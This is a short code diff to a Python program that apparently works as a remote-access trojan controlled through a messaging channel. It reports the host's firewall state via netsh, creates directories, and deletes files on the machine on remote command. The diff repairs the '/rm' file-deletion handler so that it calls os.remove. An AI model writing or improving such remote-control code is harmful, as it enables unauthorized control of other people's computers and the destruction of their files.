@@ -1,5 +1,5 @@
 import requests
-from os import chdir, getcwd
+from os import chdir, getcwd, remove
 from tkinter import Tk, Label, PhotoImage, messagebox, Toplevel
 cwd = getcwd()
 def check_internret():
@@ -234,7 +234,7 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                         os.Create_directory(name)
                         send_msg(f"{name} Directory is created.")
                     except: send_msg("Error;")
-                if command == "/rm":  #Error;
+                if command == "/rm": 
                     try:
                         send_msg("write file name(in 10 seconds):")
                         sleep(10)
@@ -243,10 +243,10 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                         sleep(10)
                         addr = read_msg()
                         if file != addr: 
-                            os.Remove_file(addr+file)
+                            remove(addr+file)
                             send_msg(f"{addr+file} is removed.")
                         else: 
-                            os.Remove_file(file)
+                            remove(file)
                             send_msg(f"{file} is removed.")
                     except: send_msg("Error;")
                 if command == "/create_file":
